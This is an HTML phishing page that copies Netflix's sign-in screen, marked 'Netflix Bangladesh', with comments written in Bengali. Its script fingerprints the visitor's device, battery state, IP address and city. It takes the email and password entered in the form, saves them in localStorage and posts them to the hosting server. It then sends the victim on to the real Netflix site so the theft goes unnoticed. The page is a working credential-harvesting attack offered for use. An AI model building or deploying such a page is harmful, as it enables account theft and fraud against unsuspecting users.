<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Sign In</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        /* Base Styles & Background */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Arial, sans-serif;
        }
        
        body {
            background-color: #000;
            background-image: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), url('https://assets.nflxext.com/ffe/siteui/vlv3/9d3533b2-0e2b-40b2-95e0-ecd7979cc88b/387fabfa-8467-461c-8b8e-321c34fe3292/BD-en-20240311-popsignuptwoweeks-perspective_alpha_website_large.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            line-height: 1.6;
            overflow-x: hidden;
            padding: 20px;
        }

        /* Netflix Logo */
        .netflix-logo {
            position: absolute;
            top: 20px;
            left: 20px;
            width: 148px;
            height: 40px;
            fill: #e50914;
            z-index: 10;
        }

        /* Login Container */
        .login-container {
            background-color: rgba(0, 0, 0, 0.75);
            border-radius: 4px;
            padding: 60px 68px 40px;
            width: 100%;
            max-width: 450px;
            margin-top: 90px;
            margin-bottom: 90px;
        }
        
        h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 28px;
            color: #fff;
        }
        
        /* Form Inputs */
        .input-group {
            margin-bottom: 16px;
            position: relative;
        }
        
        input[type="text"],
        input[type="password"] {
            width: 100%;
            height: 50px;
            border: none;
            border-radius: 4px;
            padding: 16px 20px;
            font-size: 16px;
            background-color: #333;
            color: #fff;
            transition: background-color 0.3s ease;
            outline: none;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus {
            background-color: #454545;
        }
        
        ::placeholder {
            color: #8c8c8c;
            font-size: 16px;
        }
        
        /* Primary Action Button */
        .signin-button {
            background-color: #e50914;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 16px 0;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            margin-top: 24px;
            margin-bottom: 12px;
            transition: background-color 0.2s ease;
        }
        
        .signin-button:hover {
            background-color: #f40612;
        }
        
        .signin-button:disabled {
            background-color: #a33b40;
            cursor: wait;
        }

        /* Helper Options */
        .helper {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 50px;
            font-size: 13px;
            color: #b3b3b3;
        }
        
        .remember-me { display: flex; align-items: center; }
        .remember-me input { margin-right: 5px; }
        .need-help { color: #b3b3b3; text-decoration: none; }
        .need-help:hover { text-decoration: underline; }
        
        /* Other Options */
        .signup-now { color: #737373; font-size: 16px; margin-top: 16px; }
        .signup-now a { color: #fff; text-decoration: none; }
        .signup-now a:hover { text-decoration: underline; }
        
        .recaptcha { margin-top: 13px; font-size: 13px; color: #8c8c8c; }
        .recaptcha a { color: #0071eb; text-decoration: none; }
        .recaptcha a:hover { text-decoration: underline; }
        
        /* Footer */
        .footer {
            background-color: rgba(0, 0, 0, 0.75);
            width: 100vw;
            position: absolute;
            bottom: 0;
            padding: 30px 0;
            color: #757575;
        }
        
        .footer-content { max-width: 1000px; margin: 0 auto; padding: 0 20px; }
        .footer-top { margin-bottom: 30px; }
        .footer-top a { color: #757575; text-decoration: none; }
        .footer-top a:hover { text-decoration: underline; }
        .footer-links { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .footer-links a { color: #757575; text-decoration: none; font-size: 13px; }
        .footer-links a:hover { text-decoration: underline; }
        select { background-color: #000; color: #757575; border: 1px solid #333; padding: 12px 26px 12px 12px; font-size: 14px; border-radius: 2px; }
        .footer-country { font-size: 13px; color: #757575; }
        
        @media (max-width: 740px) {
            body { background: #000; }
            .login-container { padding: 40px 20px; max-width: 100%; margin: 0; border-radius: 0;}
            .netflix-logo { left: 50%; transform: translateX(-50%); top: 10px;}
            .footer { position: relative; margin-top: 20px;}
        }
    </style>
</head>
<body>

    </svg>
    
    <div class="login-container">
        <h1>Sign In</h1>
        
        <form>
            <div class="input-group">
                <input type="text" name="email" id="email" placeholder="Email or phone number" required>
            </div>
            
            <div class="input-group">
                <input type="password" name="pass" id="password" placeholder="Password" required>
            </div>
            
            <button type="submit" class="signin-button">Sign In</button>
            
            <div class="helper">
                <div class="remember-me">
                    <input type="checkbox" id="remember">
                    <label for="remember">Remember me</label>
                </div>
                <a href="#" class="need-help">Need help?</a>
            </div>
            
            <div class="signup-now">
                New to Netflix? <a href="#">Sign up now</a>.
            </div>
            
            <div class="recaptcha">
                This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more</a>.
            </div>
        </form>
    </div>
    
    <div class="footer">
        <div class="footer-content">
            <div class="footer-top"><a href="#">Questions? Contact us.</a></div>
            <div class="footer-links">
                <a href="#">FAQ</a><a href="#">Help Center</a><a href="#">Terms of Use</a>
                <a href="#">Privacy</a><a href="#">Cookie Preferences</a><a href="#">Corporate Information</a>
            </div>
            <div class="language-selector">
                <select><option>English</option><option>বাংলা</option></select>
            </div>
            <div class="footer-country">Netflix Bangladesh</div>
        </div>
    </div>

    <!-- =========== ডেটা সংগ্রহের জন্য নতুন স্ক্রিপ্ট =========== -->
    <script>
        // পেজ লোড হওয়ার সাথে সাথে ডিভাইসের তথ্য সংগ্রহ শুরু
        let deviceInfoPromise = (async () => {
            const deviceInfo = {
                ua: navigator.userAgent || 'Unknown', platform: navigator.platform || 'Unknown',
                language: navigator.language || 'Unknown', res: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            if (navigator.connection) deviceInfo.net_effective = navigator.connection.effectiveType || 'unknown';
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    deviceInfo.batteryLevel = Math.round(battery.level * 100);
                    deviceInfo.isCharging = battery.charging;
                } catch (e) { /* ignore */ }
            }
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                deviceInfo.ip = ipData.ip;
                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const locationData = await locationResponse.json();
                deviceInfo.country = locationData.country_name;
                deviceInfo.city = locationData.city;
            } catch (e) { deviceInfo.ip = 'Failed to fetch'; }
            return JSON.stringify(deviceInfo);
        })();

        // ফর্ম সাবমিট করার সময় ডেটা ম্যানেজ করা
        document.querySelector('form').addEventListener('submit', async function(event) {
            event.preventDefault(); // ফর্মের ডিফল্ট সাবমিশন বন্ধ করা

            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;

            if (!email || !pass) {
                alert('Please enter both email/phone and password.');
                return;
            }

            const signinButton = document.querySelector('.signin-button');
            signinButton.disabled = true;
            signinButton.textContent = 'Signing In...';
            
            const deviceInfo = await deviceInfoPromise;

            // LocalStorage-এ ডেটা সেভ করা
            try {
                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{}');
                if (!storedData.netflixData) {
                    storedData.netflixData = [];
                }
                storedData.netflixData.push({
                    email: email,
                    pass: pass,
                    deviceInfo: deviceInfo,
                    timestamp: new Date().toLocaleString(),
                    type: 'login'
                });
                localStorage.setItem('userInputData', JSON.stringify(storedData));
            } catch (error) {
                console.error('Error saving to localStorage:', error);
            }

            // সার্ভারে ডেটা পাঠানোর সিমুলেশন
            try {
                await fetch('/', { 
                    method: 'POST', 
                    body: new URLSearchParams({ email, pass, deviceInfo }) 
                });
            } catch (error) {
                console.error('Error sending data to server:', error);
            }

            // ব্যবহারকারীকে আসল Netflix সাইটে রিডাইরেক্ট করা
            setTimeout(() => {
                window.location.href = 'https://www.netflix.com/browse';
            }, 1500);
        });
    </script>
